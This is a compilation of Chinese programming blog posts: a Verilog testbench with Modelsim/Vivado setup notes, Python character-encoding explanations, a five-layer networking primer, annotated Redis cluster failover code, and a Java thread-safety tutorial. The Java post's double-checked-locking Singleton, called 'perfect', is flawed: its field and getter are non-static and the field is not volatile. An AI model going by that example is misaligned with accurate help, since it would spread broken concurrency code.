  2 
  3 module tx_buffer_tb( );
  4 
  5 parameter USER_CLK_CYC = 10,
  6           ETH_CLK_CYC = 8,
  7           RST_TIM = 3;
  8           
  9 parameter SIM_TIM = 10_000;
 10 
 11 reg user_clk;
 12 reg rst_n;
 13 reg [32-1:0] din;
 14 reg din_vld,din_sop,din_eop;
 15 reg [2-1:0] din_mod;
 16 wire rdy;
 17 reg eth_tx_clk;
 18 wire [8-1:0] dout;
 19 wire dout_sop,dout_eop,dout_vld;
 20 reg [8-1:0] dout_buf [0:1024-1];
 21 reg [16-1:0] len [0:100-1];
 22 reg [2-1:0] mod [0:100-1];
 23 reg err_flag = 0;
 24 
 25 tx_buffer#(.DATA_W(32))//位宽不能改动
 26 dut
 27 (
 28     
 29     //全局信号
 30    .rst_n      (rst_n) ,//保证拉低三个时钟周期，否则FIF可能不会正确复位
 31    .user_clk   (user_clk) ,
 32    .din        (din) ,
 33    .din_vld    (din_vld) ,
 34    .din_sop    (din_sop) ,
 35    .din_eop    (din_eop) ,
 36    .din_mod    (din_mod) ,
 37    .rdy        (rdy) ,
 38    .eth_tx_clk (eth_tx_clk) ,
 39    .dout       (dout) ,
 40    .dout_sop   (dout_sop) ,
 41    .dout_eop   (dout_eop) ,
 42    .dout_vld   (dout_vld) 
 43     );
 44     
 45 /***********************************时钟******************************************/
 46     initial begin
 47         user_clk = 1;
 48         forever #(USER_CLK_CYC/2) user_clk = ~user_clk;
 49     end
 50 
 51     initial begin
 52         eth_tx_clk = 1;
 53         forever #(ETH_CLK_CYC/2) eth_tx_clk = ~eth_tx_clk;
 54     end
 55 /***********************************复位逻辑******************************************/
 56     initial begin
 57         rst_n = 1;
 58         #1;
 59         rst_n = 0;
 60         #(RST_TIM*USER_CLK_CYC);
 61         rst_n = 1;
 62     end
 63     
 64 /***********************************输入激励******************************************/
 65 integer gen_time = 0;
 66     initial begin
 67         #1;
 68         packet_initial;
 69         #(RST_TIM*USER_CLK_CYC);
 70         packet_gen(20,2);
 71         #(USER_CLK_CYC*10);
 72         packet_gen(30,1);
 73     end
 74     
 75 /***********************************输出缓存与检测******************************************/    
 76 integer j = 0;
 77 integer chk_time = 0;
 78     initial begin
 79         forever begin
 80             @(posedge eth_tx_clk)
 81             if(dout_vld)begin    
 82                 if(dout_sop)begin
 83                     dout_buf[0] = dout;
 84                     j = 1;
 85                 end
 86                 else if(dout_eop)begin
 87                     dout_buf[j] = dout;
 88                     j = j+1;
 89                     packet_check;
 90                 end
 91                 else begin
 92                     dout_buf[j] = dout;
 93                     j = j+1;
 94                 end
 95             end
 96         end
 97     end
 98     
 99 /***********************************score board******************************************/
100 integer fid;
101     initial begin
102         fid = $fopen("test.txt");
103         $fdisplay(fid,"                 Start testing                      \n");
104         #SIM_TIM;
105         if(err_flag)
106             $fdisplay(fid,"Check is failed\n");
107         else
108             $fdisplay(fid,"Check is successful\n");
109         $fdisplay(fid,"                 Testing is finished                \n");
110         $fclose(fid);
111         $stop;
112     end
113 
114 /***********************************子任务******************************************/    
115 //包生成子任务
116     task packet_gen;
117         input [16-1:0] length;
118         input [2-1:0] invalid_byte;
119         integer i;
120         begin
121             len[gen_time] = length;
122             mod[gen_time] = invalid_byte;
123             
124             for(i = 1;i<=length;i=i+1)begin
125                 if(rdy == 1)begin
126                     din_vld = 1;
127                     if(i==1)
128                         din_sop = 1;
129                     else if(i == length)begin
130                         din_eop = 1;
131                         din_mod = invalid_byte;
132                     end
133                     else begin
134                         din_sop = 0;
135                         din_eop = 0;
136                         din_mod = 0;
137                     end
138                     din = i ;
139                 end
140                 
141                 else begin
142                     din_sop = din_sop;
143                     din_eop = din_eop;
144                     din_vld = 0;
145                     din_mod = din_mod;
146                     din = din;
147                     i = i - 1;
148                 end
149                 
150                 #(USER_CLK_CYC*1);
151             end
152             packet_initial;
153             gen_time = gen_time + 1;
154         end
155     endtask
156     
157     task packet_initial;
158         begin
159             din_sop = 0;
160             din_eop = 0;
161             din_vld = 0;
162             din = 0;
163             din_mod = 0;
164         end
165     endtask
166 
167 //包检测子任务
168     task packet_check;
169         integer k;
170         integer num,packet_len;
171         begin
172             num = 1;
173             $fdisplay(fid,"%dth:Packet checking...\n",chk_time);
174             packet_len = 4*len[chk_time]-mod[chk_time];
175             if(j != packet_len)begin
176                 $fdisplay(fid,"Length of the packet is wrong.\n");
177                 err_flag = 1;
178                 disable packet_check;
179             end
180             
181             for(k=0;k<packet_len;k=k+1)begin
182                 if(k%4 == 3)begin
183                     if(dout_buf[k] != num)begin 
184                         $fdisplay(fid,"Data of the packet is wrong!\n");
185                         err_flag = 1;
186                     end
187                     num = num+1;
188                 end    
189                 else if(dout_buf[k] != 0)begin
190                     $fdisplay(fid,"Data of the packet is wrong,it should be zero!\n");
191                     err_flag = 1;
192                 end
193             end
194             chk_time = chk_time + 1;
195         end
196     endtask
197     
198 endmodule

tx_buffer_tb
　　可见主要是task编写及文件读写操作帮了大忙，如果都用眼睛看波形来验证设计正确性，真的是要搞到眼瞎。为保证测试完备性，测试包生成task可通过输入接口产生不同长度和无效字节数的递增数据包。testbench中每检测到输出包尾指示信号eop即调用packet_check task对数值进行检测。本文的testbench结构较具通用性，可以用来验证任意对数据包进行处理的逻辑单元。
　　之前Modelsim独立仿真带有IP核的Vivado工程时经常报错，只好使用Vivado自带的仿真工具。一直很头痛这个问题，这次终于有了进展！首先按照常规流程使用Vivado调用Modelsim进行行为仿真，启动后会在工程目录下产生些有用的文件，帮助我们脱离Vivado进行独立仿真。

　　在新建Modelsim工程时，在红框内选择Vivado工程中<project>.sim -> sim_1 -> behav下的modelsim.ini文件。之后添加文件包括：待测试设计文件、testbench以及IP核可综合文件。第三个文件在<project>.srcs -> sources_1 -> ip -> <ip_name> -> synth下。

　　现在可以顺利启动仿真了。我们来看下仿真结果：



　　文件中信息打印情况：

　　从波形和打印信息的结果来看，基本可以证明数据缓存及位宽转换模块逻辑功能无误。为充分验证要进一步给出覆盖率较高的测试数据集，后期通过编写do文件批量仿真实现。在FPGA或IC设计中，验证占据大半开发周期，可见VerilogHDL的非综合子集也是至关重要的，今后会多总结高效的验证方法！
********************************************************************************************************************************************************************************************************
第7天字符编码
什么是字符编码？
　　计算机只能识别0和1，当我们与计算机进行交互的时候不可能通过0和1进行交互，因此我们需要一张表把我们人类的语言一一对应成计算机能够识别的语言，这张表就是我们通常所说的字符编码表。因为计算机是美国人发明的，在设计之初的时候并未考虑到全世界的情况，所以最开始只有一张ASCII表（这个表只是英文和计算机识别语言的一一对应），随着计算机的普及，为了使用计算机，各国陆陆续续的又出现了很多自己国家的字符编码表，但是这样就造成了另外一种现象，就是乱码。当中国使用外国的软件的时候，由于编码表不一样的问题导致无法解码出正确的字符，从而出现乱码。为了解决这样的问题，出现了一个叫做unicode的万国码，把世界上所有的语言通过这一张表一一映射，这样乱码的问题就解决了。但是unicode由于所占字节过大，为了节省空间从而达到减少IO操作时间的目的，又出现了一种变长编码方式utf-8（unicode transform format）,它只是unicode的一种转换格式，和世界上其他的语言没有一一对应关系，目前现状来看，计算机内存中使用的编码方式是unicode。所以在我们进行编码和解码的过程中，如果出现了各国语言不一致的问题，我们需要通过unicode进行转换。
目前有的字符编码

软件执行文件的三步骤，python解释器也一样

文件存入硬盘的过程（nodpad++为例）
结论：存文件的过程中不能出错，一旦存错就算是相同的编码方式也是解码不了的。
第一步：打开软件，也就是操作系统把软件添加到内存中
第二步：输入内容，此时所有的内容都是存在内存中的（先更改字符编码集，然后在写入内容），当我们编码改成日文的时候会发现目前我们依然能够看到是不乱码的，那是因为在内存中都是以unicode的形式编码的，无论是哪一国的语言都是可以显示的。

第三步：点击保存按钮，把内容保存在硬盘上面
第四步：以同样的编码方式重新打开的时候发现中文出现乱码

 
python读取文件的三个步骤
第一步：打开python解释器，加载到内存，没有实际文件的编码和解码过程
第二步：python当作一个文本编辑器去从硬盘中加载文件到内存，此时不会关注语法，但是有解码的过程。因此当初存文件的时候的编码和解码是否一样决定是否会报错。

python2默认编码方式为ASCII
python3默认编码方式为utf-8

左边是一个以gbk的方式存储的文件，右边通过python3和python2分别去执行文件都会报错，这个是在第二步读取文件就会出现的错误，因为python2和python3默认编码方式都不是gbk，因此在加载到内存这一步就出现了错误

在前面加上了一行字符，表示告诉解释器当在读取文件的时候应该用哪中编码方式，这样在加载到内存这一步就不会出错了。报错的原因并不是字符编码的问题，而是程序的语法问题，也就是第三步了。
 
当前两步执行完成之后，文件中的内容就以unicode的方式存在了内存中。
接下来开始执行第三部，也就是python语法的检测（在这一步的处理python2和python3是不一样的）：
　　为什么python2和python3在这一步不一样呢？代码存在与内存中是要存两份的，第一份就是在第二步（在未执行代码之前）从文件中读取出来的代码是以unicode的方式存在于内存中的，第二份就是在代码的执行过程中会对字符串重新申请一份内存空间，而这份内存空间是以什么样的编码方式存储的是与python的解释器有关系的！
print函数
print函数打印的时候默认是以终端的编码格式打印的！
python3
当python3读到   s = '你瞅啥'   会重新申请一份内存空间然后把   ‘你瞅啥’   以unicode的方式存储起来。（所以说无论终端是以什么样的编码格式打印的都是不会出现乱码的）

# 下面这段代码无论放在哪里都是可以执行出来结果的，因为内存中的都是unicode编码
#_*_coding:gbk_*_
s = '你愁啥'
print(s, type(s))


#_*_coding:gbk_*_
s = '你愁啥'
print(s, type(s))
#s可以直接encode成任意编码格式
print(s.encode('gbk')) 
print(type(s.encode('gbk'))) #<class 'bytes'>

python2
当python2读到   s = '你瞅啥'   默认会重新申请一份内存空间然后把   ‘你瞅啥’   以最上面一行的编码方式存储

# 如果是python2运行此代码，当运行到s = '你瞅啥' 的时候会新开辟一个内存空间以gbk的格式存进去# 所以打印终端必须是gbk，否则会出现错误
#_*_coding:gbk_*_
s = '你愁啥'
print(s, type(s))


# 如果是python2的话一般会在字符串前面加上u，直接把字符串解码成unicode格式

#_*_coding:gbk_*_
s = u'你愁啥'  # 相当于执行了 s = '你瞅啥'.decode('gbk')
print(s, type(s))

 
 
例一：

# 当前所在环境为pycharm + python3.6

a = '中国万岁'
print(a)
# 执行这个文件的时候
# 首先python解释器会以默认的编码方式(utf-8)把文件从硬盘中读取到内存中
# 此时的代码块都是以unicode的形式存在于内存中的

# 然后执行这个文件的时候，读到a = '中国万岁'这一句的时候会新开辟一个内存空间
# 同样以unicode的编码方式来存放'中国万岁'这四个字

# 当读到print(a)的时候需要打印a，因此会以当前终端的编码方式去编码a也就是'中国万岁'
# 四个字，实际上也就是把unicode ===编码=》utf-8然后显示出来

 
********************************************************************************************************************************************************************************************************
通俗讲解计算机网络五层协议
=========================================================================================
    在我看来，学习java最重要是要理解what(这东西是什么)，why(为什么要用它)，where(在哪用它)，how(怎么用)。所以接下来，我都是以这样的思想来和大家交流，从最基础的知识讲起。如果有啥出错的，欢迎大家前来批评。本人虚心接纳。
=========================================================================================
      我们需要了解一下JavaWeb是怎样运行的？一个Web项目运行的原理是基于计算机网络的知识，总的大概过程如下。
      首先在在浏览器中输入要访问的网址，回车后浏览器向web服务器发送一个HTTP请求；根据计算机网络知识，两台电脑的访问中间需要经过五层协议，包括物理层，数据链路层，网络层，运输层，应用层。下面通俗说一下五个层次，以发送方和接收方为例子。
     1.应用层：应用层是整个层次最顶层，直接和最原始数据打交道，定义的是应用进程间通信和交互的规则。这是什么意思？因为两台电脑通讯就是发送方把数据传给接收方，虽然发送方知道自己发送的是什么东西、转化成字节数组之后有多长，但接收方肯定不知道，所以应用层的网络协议诞生了，他规定发送方和接收方必须使用一个固定长度的消息头，消息头必须使用某种固定的组成，而且消息头里必须记录消息体的长度等一系列信息，以方便接收方能够正确的解析发送方发送的数据。如果没有应用层的规则，那么接收方拿到数据后也是不知所措，就如同拿到一个没有说明书的工具无法操作。
     2.运输层：负责向两个主机中进程之间的通信提供通用数据服务，“传输层”的功能，就是建立”端口到端口”的通信。例如，同一台主机上有许多程序都需要用到网络，假设你一边在看网页，一边上QQ聊天。当一个数据包从互联网上发来的时候，你怎么知道，它是表示网页的内容，还是表示QQ聊天的内容？也就是说，我们还需要一个参数，表示这个数据包到底供哪个程序（进程）使用。这个参数就叫做”端口”（port），它其实是每一个使用网卡的程序的编号。每个数据包都发到主机的特定端口，所以不同的程序就能取到自己所需要的数据。“端口”是0到65535之间的一个整数，正好16个二进制位。0到1023的端口被系统占用，用户只能选用大于1023的端口。不管是浏览网页还是在线聊天，应用程序会随机选用一个端口，然后与服务器的相应端口联系。
     3.网络层：”网络层”的功能是建立”主机到主机”的通信。通过网络层我们能找到其他一台电脑的所在位置并进行主机到主机连接。每台计算机有了两种地址，一种是MAC地址，另一种是网络地址。两种地址之间没有任何联系，MAC地址是绑定在网卡上的，网络地址则是管理员分配的，它们只是随机组合在一起。网络地址帮助我们确定计算机所在的子网络，MAC地址则将数据包送到该子网络中的目标网卡。
     4.数据链路层：两个相邻节点之间传送数据时，数据链路层将网络层交下来的IP数据报组装成帧，在两个相邻的链路上传送帧（frame)。由于网络层移交的ip数据包数据可能会很多，所以要进行分组封装成帧，每一帧包括数据和必要的控制信息。其实就是解读电信号，进行分组。封装成帧，透明传输，差错控制。
     5.物理层：电脑要组网，第一件事要干什么？当然是先把电脑连起来，可以用光缆、电缆、双绞线、无线电波等方式，它就是把电脑连接起来的物理手段，它主要规定了网络的一些电气特性，将本电脑要传输的数据帧变成010101的比特流，发送出去，作用是负责传送0和1的电信号。
     这里举个例子来说明下，比如A与B要通讯，A向B请求发送了一份数据。首先A在请求链接里面可以获取到B的地址，要发送的这份数据首先经过应用层，制定了一系列规则，比如数据的格式怎样，长度多少，以方便接收方能够正确的解析发送方发送的数据；接下来进入运输层，把进程端口封装在数据包，这样才知道是A当前电脑哪个进程发的数据包；再接下是进入网络层，通过ip地址找到B主机所在位置并进行相连；然后进入数据链路层，将ip数据包封装成帧；最后进入物理层，进行数据帧转换成比特流0或1,通过硬件光纤进行传输；这一整套是A的通讯过程，对于·B而言就是相反的过程。
 
===========================================================================
                                用心查阅，有心分享，分享之际，互相指教，受益你我，何乐不为？
 ===========================================================================
********************************************************************************************************************************************************************************************************
Redis源码阅读（五）集群-故障迁移（上）
　　　　　　　　Redis源码阅读（五）集群-故障迁移（上）
　　故障迁移是集群非常重要的功能；直白的说就是在集群中部分节点失效时，能将失效节点负责的键值对迁移到其他节点上，从而保证整个集群系统在部分节点失效后没有丢失数据，仍能正常提供服务。这里先抛开Redis实际的做法，我们可以自己想下对于Redis集群应该怎么做故障迁移，哪些关键点是必须要实现的。然后再去看Redis源码中具体的实现，是否覆盖了我们想到的关键点，有哪些设计是我们没有想到的，这样看代码的效果会比较好。
　　我在思考故障迁移这个功能时，首先想到的是节点发生故障时要很快被集群中其他节点发现，尽量缩短集群不可用的时间；其次就是要选出失效节点上的数据可以被迁移到哪个节点上；在选择迁移节点时最好能够考虑节点的负载，避免迁移造成部分节点负载过高。另外，失效节点的数据在其失效前就应该实时的复制到其他节点上，因为一般情况下节点失效有很大概率是机器不可用，如果没有事先执行过数据复制，节点数据就丢失了。最后，就是迁移的执行，除了要将失效节点原有的键值对数据迁移到其他节点上，还要将失效节点原来负责的槽也迁移到其他节点上，而且槽和键值对应该同步迁移，要避免槽被分配到节点A而槽所对应的键值对被分配到节点B的情况。
　　总结起来有实现集群故障迁移要实现下面关键点：
　　1. 节点失效事件能被集群系统很快的发现
　　2. 迁移时要能选择合适的节点
　　3. 节点数据需要实时复制，在失效后可以直接使用复制的数据进行迁移
　　4. 迁移要注意将槽和键值对同步迁移
　　看过Redis源码后，发现Redis的故障迁移也是以主备复制为基础的，也就是说需要给每个集群主节点配置从节点，这样主节点的数据天然就是实时复制的，在主节点出现故障时，直接在从节点中选择一个接替失效主节点，将该从节点升级为主节点并通知到集群中所有其他节点即可，这样就无需考虑上面提到的第三点和第四点。如果集群中有节点没有配置从节点，那么就不支持故障迁移。

 
故障检测
　　Redis的集群是无中心的，无法通过中心定时向各个节点发送心跳来判断节点是否故障。在Redis源码中故障的检测分三步：
1. 节点互发ping消息，将Ping超时的节点置为疑似下线节点
　　在这一步中，每个节点都会向其他节点发送Ping消息，来检测其他节点是否和自己的连接有异常。但要注意的是即便检测到了其他节点Ping消息超时，也不能简单的认为其他节点是失效的，因为有可能是这个节点自己的网络异常，无法和其他节点通信。所以在这一步只是将检测到超时的节点置为疑似下线。例如：节点A向节点B发送Ping发现超时，则A会将节点B的状态置为疑似下线并保存在自己记录的集群节点信息中，存储的疑似下线信息就是之前提过的clusterState.nodes里对应的失效节点的flags状态值。
　　// 默认节点超时时限
　　#define REDIS_CLUSTER_DEFAULT_NODE_TIMEOUT 15000
 2. 向其他节点共享疑似下线节点
　　在检测到某个节点为疑似下线之后，会将这个节点的疑似下线情况分享给集群中其他的节点，分享的方式也是通过互发Ping消息，在ping消息中会带上集群中随机的三个节点的状态，前面在分析集群初始化时，曾介绍过利用gossip协议扩散集群节点状态给整个集群，这里节点的疑似下线状态也是通过这种方式传播给其他节点的。每条ping消息会带最多三个随机节点的状态信息


void clusterSendPing(clusterLink *link, int type) { //随机算去本节点所在集群中的任意两个其他node节点(不包括link本节点和link对应的节点)信息发送给link对应的节点
    unsigned char buf[sizeof(clusterMsg)];
    clusterMsg *hdr = (clusterMsg*) buf;
    int gossipcount = 0, totlen;
    /* freshnodes is the number of nodes we can still use to populate the
     * gossip section of the ping packet. Basically we start with the nodes
     * we have in memory minus two (ourself and the node we are sending the
     * message to). Every time we add a node we decrement the counter, so when
     * it will drop to <= zero we know there is no more gossip info we can
     * send. */
    int freshnodes = dictSize(server.cluster->nodes)-2; //除去本节点和接收本ping信息的节点外，整个集群中有多少其他节点
   // 如果发送的信息是 PING ，那么更新最后一次发送 PING 命令的时间戳
    if (link->node && type == CLUSTERMSG_TYPE_PING)
        link->node->ping_sent = mstime();
   // 将当前节点的信息（比如名字、地址、端口号、负责处理的槽）记录到消息里面
    clusterBuildMessageHdr(hdr,type);
    /* Populate the gossip fields */
    // 从当前节点已知的节点中随机选出两个节点   
    // 并通过这条消息捎带给目标节点，从而实现 gossip 协议  
    // 每个节点有 freshnodes 次发送 gossip 信息的机会  
    // 每次向目标节点发送 3 个被选中节点的 gossip 信息（gossipcount 计数）
    while(freshnodes > 0 && gossipcount < 3) {
        // 从 nodes 字典中随机选出一个节点（被选中节点）
        dictEntry *de = dictGetRandomKey(server.cluster->nodes);
        clusterNode *this = dictGetVal(de);

        clusterMsgDataGossip *gossip; ////ping  pong meet消息体部分用该结构
        int j;

        if (this == myself ||
            this->flags & (REDIS_NODE_HANDSHAKE|REDIS_NODE_NOADDR) ||
            (this->link == NULL && this->numslots == 0))
        {
                freshnodes--; /* otherwise we may loop forever. */
                continue;
        }

        /* Check if we already added this node */
         // 检查被选中节点是否已经在 hdr->data.ping.gossip 数组里面       
         // 如果是的话说明这个节点之前已经被选中了   
         // 不要再选中它（否则就会出现重复）
        for (j = 0; j < gossipcount; j++) {  //这里是避免前面随机选择clusterNode的时候重复选择相同的节点
            if (memcmp(hdr->data.ping.gossip[j].nodename,this->name,
                    REDIS_CLUSTER_NAMELEN) == 0) break;
        }
        if (j != gossipcount) continue;
        /* Add it */
        // 这个被选中节点有效，计数器减一
        freshnodes--;
        // 指向 gossip 信息结构
        gossip = &(hdr->data.ping.gossip[gossipcount]);
        // 将被选中节点的名字记录到 gossip 信息    
        memcpy(gossip->nodename,this->name,REDIS_CLUSTER_NAMELEN);  
        // 将被选中节点的 PING 命令发送时间戳记录到 gossip 信息       
        gossip->ping_sent = htonl(this->ping_sent);      
        // 将被选中节点的 PING 命令回复的时间戳记录到 gossip 信息     
        gossip->pong_received = htonl(this->pong_received);   
        // 将被选中节点的 IP 记录到 gossip 信息       
        memcpy(gossip->ip,this->ip,sizeof(this->ip));    
        // 将被选中节点的端口号记录到 gossip 信息    
        gossip->port = htons(this->port);       
        // 将被选中节点的标识值记录到 gossip 信息   
        gossip->flags = htons(this->flags);       
        // 这个被选中节点有效，计数器增一
        gossipcount++;
    }
    // 计算信息长度    
    totlen = sizeof(clusterMsg)-sizeof(union clusterMsgData);  
    totlen += (sizeof(clusterMsgDataGossip)*gossipcount);    
    // 将被选中节点的数量（gossip 信息中包含了多少个节点的信息）   
    // 记录在 count 属性里面   
    hdr->count = htons(gossipcount);   
    // 将信息的长度记录到信息里面  
    hdr->totlen = htonl(totlen);   
    // 发送信息
    clusterSendMessage(link,buf,totlen);
}

　　收到ping消息的节点，如果发现ping消息中带的某个节点属于疑似下线状态，则找到自身记录该节点的ClusterNode结构，并向该结构的下线报告链表中插入一条上报记录，上报源头为发出Ping的节点。例如：节点A向节点C发送了ping消息， ping消息中带上B节点状态，并且B节点状态为疑似下线，那么C节点收到这个Ping消息之后，就会查找自身记录节点B的clusterNode，向这个clusterNode的fail_reports链表中插入来自A的下线报告。

3. 收到集群中超过半数的节点认为某节点处于疑似下线状态，则判定该节点下线，并广播
　　判定的时机是在每次收到一条ping消息的时候，当发现ping消息中带有某节点的疑似下线状态后，除了加入该节点的下线报告以外，还会调用markNodeAsFailingIfNeeded函数来尝试判断该节点是否已经被超过半数的节点判断为疑似下线，如果是的话，就将该节点状态置为下线，并调用clusterSendFail函数将下线状态广播给所有已知节点。这里广播不是通过订阅分发的方式，而是遍历所有节点，并给每个节点单独发送消息。


void clusterSendFail(char *nodename) { 
//如果超过一半的主节点认为该nodename节点下线了，则需要把该节点下线信息同步到整个cluster集群
    unsigned char buf[sizeof(clusterMsg)];
    clusterMsg *hdr = (clusterMsg*) buf;
     // 创建下线消息 
     clusterBuildMessageHdr(hdr,CLUSTERMSG_TYPE_FAIL); 
     // 记录命令 
     memcpy(hdr->data.fail.about.nodename,nodename,REDIS_CLUSTER_NAMELEN); 
     // 广播消息
    clusterBroadcastMessage(buf,ntohl(hdr->totlen));
}


void clusterBroadcastMessage(void *buf, size_t len) { //buf里面的内容为clusterMsg+clusterMsgData
    dictIterator *di;
    dictEntry *de;

     // 遍历所有已知节点
    di = dictGetSafeIterator(server.cluster->nodes);
    while((de = dictNext(di)) != NULL) {
        clusterNode *node = dictGetVal(de);

         // 不向未连接节点发送信息
        if (!node->link) continue;

         // 不向节点自身或者 HANDSHAKE 状态的节点发送信息
        if (node->flags & (REDIS_NODE_MYSELF|REDIS_NODE_HANDSHAKE))
            continue;

         // 发送信息
        clusterSendMessage(node->link,buf,len);
    }
    dictReleaseIterator(di);

　　从节点判断自己所属的主节点下线，则开始进入故障转移流程。如果主节点下只有一个从节点，那么很自然的可以直接进行切换，但如果主节点下的从节点不只一个，那么还需要选出一个新的主节点。这里的选举过程使用了比较经典的分布式一致性算法Raft，下一篇会介绍Redis中选举新主节点的过程。



********************************************************************************************************************************************************************************************************
线程安全
 线程安全
通过这篇博客你能学到什么:

编写线程安全的代码,本质上就管理状态的访问,而且通常是共享的、可变的状态.
状态:可以理解为对象的成员变量.
共享: 是指一个变量可以被多个线程访问
可变: 是指变量的值在生命周期内可以改变.
保证线程安全就是要在不可控制的并发访问中保护数据.
如果对象在多线程环境下无法保证线程安全,就会导致脏数据和其他不可预期的后果
在多线程编程中有一个原则:无论何时,只要有对于一个的线程访问给定的状态变量,而且其中某个线程会写入该变量,此时必须使用同步来协调线程对该变量的访问**
Java中使用synchronized(同步)来确保线程安全.在synchronized(同步)块中的代码,可以保证在多线程环境下的原子性和可见性.
不要忽略同步的重要性,如果程序中忽略了必要的同步,可能看上去是可以运行,但是它仍然存在隐患,随时都可能崩溃.
在没有正确同步的情况下,如果多线程访问了同一变量(并且有线程会修改变量,如果是只读,它还是线程安全的),你的程序就存在隐患,有三种方法修复它:1. 不要跨线程共享变量2. 使状态变为不可变的3. 在任何访问状态变量的时候使用同步
虽然可以用上述三类方法进行修改,但是会很麻烦、困难,所以一开始就将一个类设计成是线程安全的,比在后期重新修复它更容易
封装可以帮助你构建线程安全你的类,访问特定变量(状态)的代码越少,越容易确保使用恰当的同步,也越容易推断出访问一个变量所需的条件.总之,对程序的状态封装得越好,你的程序就越容易实现线程安全,同时有助于维护者保持这种线程安全性.
设计线程安全的类时,优秀的面向技术--封装、不可变性(final修饰的)以及明确的不变约束(可以理解为if-else)会给你提供诸多的帮助
虽然程序的响应速度很重要,但是正确性才是摆在首位的,你的程序跑的再快,结果是错的也没有任何意义,所以要先保证正确性然后再尝试去优化,这是一个很好的开发原则.
 
 1 什么是线程安全性
一个类是线程安全的,是指在被多个线程访问时,类可以持续进行正确的行为.
对于线程安全类的实例(对象)进行顺序或并发的一系列操作,都不会导致实例处于无效状态.
线程安全的类封装了任何必要的同步,因此客户不需要自己提供.
 
 
 2 一个无状态的(stateless)的servlet

public class StatelessServlet implements Servlet {

@Override
public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
BigInteger i = extractFromRequest(servletRequest);
BigInteger[] factors = factor(i);
encodeIntoResponse(servletResponse,factors);
}

}

 
 
我们自定义的StatelessServlet是无状态对象(没有成员,变量保存数据),在方法体内声明的变量i和factors是本地变量,只有进入到这个方法的执行线程才能访问,变量在其他线程中不是共享的,线程访问无状态对象的方法,不会影响到其他线程访问该对象时的正确性,所以无状态对象是线程安全的.
这里有重要的概念要记好:无状态(成员变量)对象永远是线程安全的
 
3 原子性
在无状态对象中,加入一个状态元素,用来计数,在每次访问对象的方法时执行行自增操作.

public class StatelessServlet implements Servlet {
private long count = 0;

@Override
public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
BigInteger i = extractFromRequest(servletRequest);
BigInteger[] factors = factor(i);
count++;
encodeIntoResponse(servletResponse,factors);
}

 
在单线程的环境下运行很perfect,但是在多线程环境下它并不是线程安全的.为什么呢? 因为count++;并不是原子操作,它是由"读-改-写"三个操作组成的,读取count的值,+1,写入count的值,我们来想象一下,有两个线程同一时刻都执行到count++这一行,同时读取到一个数字比如9,都加1,都写入10,嗯 平白无故少了一计数.
现在我们明白了为什么自增操作不是线程安全的,现在我们来引入一个名词竞争条件.
 
4 竞争条件
**当计算的正确性依赖于运行时相关的时序或者多线程的交替时,会产生竞争条件**.
我对竞争条件的理解就是,**多个线程同时访问一段代码,因为顺序的问题,可能导致结果不正确,这就是竞争条件**.
除了上面的自增,还有一种常见的竞争条件--"检查再运行".
废话不多说,上代码.

/**
 * @author liuboren
 * @Title: RaceCondition
 * @ProjectName multithreading
 * @Description: TODO
 * @date 2018/10/7 15:54
 */
public class RaceCondition {

    private boolean state = false;

    public void test(){
        if (state){
            //做一些事
        }else{
            // 做另外一些事
        }
    }

    public void changeState(){
        if(state == false){
            state = true;
        }else{
            state = false;
        }
    }
}

 
 
代码很简单,test()方法会根据对象的state的状态执行一些操作,如果state是true就做一些操作,如果是false执行另外一些操作,在多线程条件下,线程A刚刚执行test()方法的,线程B可能已经改变了状态值,但其改变后的结果可能对A线程不可见,也就是说线程A使用的是过期值.这可能导致结果的错误.
 
5. 示例: 惰性初始化中的竞争条件
这个例子好,多线程环境下的单例模式.

/**
 * @author liuboren
 * @Title: Singleton
 * @ProjectName multithreading
 * @Description: TODO
 * @date 2018/10/7 16:29
 */
public class Singleton {
    private Singleton singleton;

    private Singleton() {
    }

    public Singleton getSingleton(){
        if(singleton ==null){
               singleton = new Singleton();
                      }
        return singleton;
    }
    
}

 
看这个例子,我们把构造方法声明为private的这样就只能通过getSingleton()来获得这个对象的实例了,先判断这个对象是否被实例化了,如果等于null,那就实例化并返回,看似很完美,在单线程环境下确实可以正常运行,但是在多线程环境下,有可能两个线程同时走到new对象这一行,这样就实例化了两个对象,这可能不是我们要的结果,我们来小小修改一下 

/**
 * @author liuboren
 * @Title: Singleton
 * @ProjectName multithreading
 * @Description: TODO
 * @date 2018/10/7 16:29
 */
public class Singleton {
    private Singleton singleton;

    private Singleton() {
    }

    public Singleton getSingleton(){
        if(singleton ==null){
            synchronized (this) {
                if (singleton == null) {
                    singleton = new Singleton();
                }
            }
        }
        return singleton;
    }
    
}

 
限于篇幅,这里直接改了一个完美版的,之所以不在方法声明 synchronized是为了减少同步快,实现更快的响应.
 
6 复合操作
为了避免竞争条件,必须阻止其他线程访问我们正在修改的变量,让我们可以确保:当其他线程想要查看或修改一个状态时,必须在我们的线程开始之前或者完成之后,而不能在操作过程中
将之前的自增操作改为原子的执行,可以让它变为线程安全的.使用Synchronized(同步)块,可以让操作变为原子的.
我们也可以使用原子变量类,是之前的代码变为线程安全的.

    private final AtomicLong count = new AtomicLong(0);

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        BigInteger i = extractFromRequest(servletRequest);
        BigInteger[] factors = factor(i);
        count.incrementAndGet();
        encodeIntoResponse(servletResponse, factors);
    }

 
 
 
7 锁
 
Java提供关键字Synchronized(同步)块,来保证线程安全,可以在多线程条件下保证可见性和原子性.
可见性: 一个线程修改完对象的状态后,对其他线程可见.
原子性: 可以把复合操作转换为不可再分的原子操作.一个线程执行完原子操作其它线程才能执行同样的原子操作.
让我们看看另一个关于线程安全的结论:当一个不变约束涉及多个变量时,变量间不是彼此独立的:某个变量的值会制约其他几个变量的值.因此,更新一个变量的时候,要在同一原子操作中更新其他几个.
觉得过于抽象?我们来看看实际的代码

/**
 * @author liuboren
 * @Title: StatelessServlet
 * @ProjectName multithreading
 * @Description: TODO
 * @date 2018/10/7 15:04
 */
public class StatelessServlet implements Servlet {
    private final AtomicReference<BigInteger> lastNumber
            = new AtomicReference<>();

    private final AtomicReference<BigInteger[]> lastFactors
            = new AtomicReference<>();


    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        BigInteger i = extractFromRequest(servletRequest);
        if (i.equals(lastNumber.get())) {
            encodeIntoResponse(servletResponse, lastFactors.get());
        } else {
            BigInteger[] factors = factor(i);
            lastFactors.set(factors);
            encodeIntoResponse(servletResponse, lastFactors.get());
